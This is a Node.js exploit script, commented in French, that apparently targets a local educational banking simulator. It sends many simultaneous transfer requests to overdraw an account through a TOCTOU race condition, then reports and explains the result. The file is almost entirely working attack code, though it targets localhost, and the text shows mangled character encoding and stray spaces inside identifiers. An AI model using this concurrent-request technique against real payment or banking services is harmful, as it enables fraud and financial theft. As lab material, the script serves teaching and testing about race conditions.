/**
 * üöÄ EXPLOIT SCRIPT - Race Condition Demonstration (Node.js)
 * 
 * Ce script d√©montre l'exploitation d'une race condition
 * en envoyant plusieurs requ√™tes de transfert simultan√©es.
 * 
 * Usage: node exploit/exploit.js
 */

const http = require('http');

// ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// CONFIGURATION
// ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const CONFIG = {
  host: 'localhost',
  port: 3000,
  fromAccount: 1,      // Alice
  toAccount: 2,        // Bob
  amountPerRequest: 100,
  numberOfRequests: 10
};

// ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// HTTP HELPERS
// ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

/**
 * Effectue une requ√™te HTTP
 */
function httpRequest(options, body = null) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          resolve(data);
        }
      });
    });
    
    req.on('error', reject);
    
    if (body) {
      req.write(JSON.stringify(body));
    }
    
    req.end();
  });
}

/**
 * R√©cup√®re les comptes
 */
async function getAccounts() {
  const options = {
    hostname: CONFIG. host,
    port: CONFIG. port,
    path: '/api/accounts',
    method: 'GET'
  };
  
  return await httpRequest(options);
}

/**
 * Effectue un transfert
 */
async function transfer(from, to, amount) {
  const options = {
    hostname: CONFIG.host,
    port: CONFIG.port,
    path: '/api/transfer',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    }
  };
  
  return await httpRequest(options, { from, to, amount });
}

/**
 * R√©initialise la base de donn√©es
 */
async function resetDatabase() {
  const options = {
    hostname: CONFIG.host,
    port: CONFIG.port,
    path: '/api/reset',
    method: 'POST'
  };
  
  return await httpRequest(options);
}

// ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// EXPLOIT LOGIC
// ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

/**
 * Affiche une ligne de s√©paration
 */
function printSeparator(char = '‚ïê', length = 60) {
  console.log(char. repeat(length));
}

/**
 * Affiche les soldes des comptes
 */
function printBalances(accounts, title) {
  console.log(`\nüìä ${title}:`);
  accounts.forEach(acc => {
    const status = acc.balance < 0 ? '‚ö†Ô∏è  N√âGATIF!' : '';
    console.log(`   ${acc.name}: ${acc.balance. toFixed(2)}‚Ç¨ ${status}`);
  });
  
  const total = accounts.reduce((sum, acc) => sum + acc.balance, 0);
  console.log(`   ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ`);
  console.log(`   Total: ${total.toFixed(2)}‚Ç¨ (attendu: 2000‚Ç¨)`);
  
  if (total !== 2000) {
    console.log(`   üö® ANOMALIE D√âTECT√âE: ${(total - 2000).toFixed(2)}‚Ç¨`);
  }
}

/**
 * Ex√©cute l'exploitation
 */
async function runExploit() {
  console.log('\n');
  printSeparator();
  console.log('  üè¶ BANKSIM - Exploit de Race Condition');
  printSeparator();
  
  console.log('\nüîß Configuration:');
  console.log(`   Requ√™tes simultan√©es: ${CONFIG.numberOfRequests}`);
  console.log(`   Montant par requ√™te: ${CONFIG.amountPerRequest}‚Ç¨`);
  console. log(`   De: Compte #${CONFIG.fromAccount} (Alice)`);
  console.log(`   Vers: Compte #${CONFIG. toAccount} (Bob)`);
  
  // Step 1: Reset database
  console.log('\nüîÑ R√©initialisation de la base de donn√©es.. .');
  await resetDatabase();
  
  // Step 2: Get initial balances
  const initialData = await getAccounts();
  if (! initialData.success) {
    console.error('‚ùå Erreur: Impossible de r√©cup√©rer les comptes');
    process.exit(1);
  }
  
  printBalances(initialData.accounts, '√âtat initial');
  
  const initialAlice = initialData.accounts.find(a => a.id === CONFIG.fromAccount);
  const initialBob = initialData. accounts.find(a => a. id === CONFIG.toAccount);
  
  // Step 3: Prepare concurrent requests
  console.log('\n‚ö° Pr√©paration des requ√™tes simultan√©es...');
  
  const transferPromises = [];
  for (let i = 0; i < CONFIG.numberOfRequests; i++) {
    transferPromises. push(
      transfer(CONFIG.fromAccount, CONFIG.toAccount, CONFIG.amountPerRequest)
        .then(result => ({ id: i + 1, ...result }))
        .catch(error => ({ id: i + 1, success: false, error: error.message }))
    );
  }
  
  // Step 4: Execute all requests simultaneously
  console.log(`\nüöÄ Envoi de ${CONFIG.numberOfRequests} requ√™tes simultan√©es...`);
  printSeparator('‚îÄ');
  
  const startTime = Date.now();
  const results = await Promise.all(transferPromises);
  const endTime = Date.now();
  
  // Step 5: Analyze results
  console.log('\nüìù R√©sultats des requ√™tes:');
  
  let successCount = 0;
  let failCount = 0;
  
  results.forEach(result => {
    if (result. success) {
      console.log(`   ‚úÖ Requ√™te #${result.id}: Succ√®s`);
      successCount++;
    } else {
      console.log(`   ‚ùå Requ√™te #${result.id}: √âchec - ${result.error || 'Solde insuffisant'}`);
      failCount++;
    }
  });
  
  // Step 6: Get final balances
  const finalData = await getAccounts();
  printBalances(finalData.accounts, '√âtat final');
  
  const finalAlice = finalData.accounts.find(a => a.id === CONFIG.fromAccount);
  const finalBob = finalData. accounts.find(a => a. id === CONFIG.toAccount);
  
  // Step 7: Summary
  printSeparator();
  console.log('  üìà R√âSUM√â DE L\'EXPLOITATION');
  printSeparator();
  
  console.log(`\n‚è±Ô∏è  Temps d'ex√©cution: ${endTime - startTime}ms`);
  console.log(`üìä Statistiques:`);
  console.log(`   Requ√™tes r√©ussies: ${successCount}/${CONFIG.numberOfRequests}`);
  console.log(`   Requ√™tes √©chou√©es: ${failCount}/${CONFIG.numberOfRequests}`);
  
  const totalTransferred = successCount * CONFIG.amountPerRequest;
  console.log(`\nüí∞ Analyse financi√®re:`);
  console.log(`   Solde initial d'Alice: ${initialAlice. balance.toFixed(2)}‚Ç¨`);
  console.log(`   Total transf√©r√©: ${totalTransferred.toFixed(2)}‚Ç¨`);
  console.log(`   Solde final d'Alice: ${finalAlice.balance. toFixed(2)}‚Ç¨`);
  console.log(`   Gain de Bob: ${(finalBob.balance - initialBob.balance).toFixed(2)}‚Ç¨`);
  
  // Check if exploit was successful
  const exploitSuccessful = totalTransferred > initialAlice.balance;
  
  console.log('\n');
  printSeparator();
  
  if (exploitSuccessful) {
    console.log('  üí• EXPLOITATION R√âUSSIE!');
    printSeparator();
    console. log(`\n  Alice a transf√©r√© ${totalTransferred.toFixed(2)}‚Ç¨`);
    console.log(`  alors qu'elle n'avait que ${initialAlice.balance.toFixed(2)}‚Ç¨! `);
    
    if (finalAlice.balance < 0) {
      console.log(`\n  ‚ö†Ô∏è  Son solde est maintenant N√âGATIF: ${finalAlice.balance.toFixed(2)}‚Ç¨`);
    }
    
    console.log('\n  üîç Explication:');
    console.log('  Plusieurs requ√™tes ont v√©rifi√© le solde simultan√©ment');
    console.log('  AVANT que les autres ne le mettent √† jour.');
    console.log('  C\'est une vuln√©rabilit√© TOCTOU (Time Of Check To Time Of Use).');
  } else {
    console.log('  ‚ÑπÔ∏è  EXPLOITATION NON CONCLUANTE');
    printSeparator();
    console. log('\n  Le timing n\'a pas permis d\'exploiter la faille cette fois.');
    console.log('  Suggestions:');
    console.log('  - Augmentez le nombre de requ√™tes');
    console.log('  - Relancez le script plusieurs fois');
    console.log('  - V√©rifiez que le serveur vuln√©rable est bien lanc√©');
  }
  
  console.log('\n');
}

// ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// MAIN
// ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

// Parse command line arguments
const args = process.argv.slice(2);

args.forEach((arg, index) => {
  if (arg === '-n' || arg === '--requests') {
    CONFIG.numberOfRequests = parseInt(args[index + 1]) || CONFIG.numberOfRequests;
  }
  if (arg === '-a' || arg === '--amount') {
    CONFIG.amountPerRequest = parseFloat(args[index + 1]) || CONFIG. amountPerRequest;
  }
  if (arg === '-h' || arg === '--help') {
    console.log(`
üè¶ BankSim Exploit Script

Usage: node exploit. js [options]

Options:
  -n, --requests <number>  Nombre de requ√™tes simultan√©es (d√©faut: 10)
  -a, --amount <number>    Montant par requ√™te en ‚Ç¨ (d√©faut: 100)
  -h, --help               Affiche cette aide

Exemples:
  node exploit.js
  node exploit.js -n 20 -a 50
  node exploit.js --requests 15 --amount 200
    `);
    process.exit(0);
  }
});

// Run the exploit
runExploit(). catch(error => {
  console.error('üí• Erreur fatale:', error. message);
  process.exit(1);
});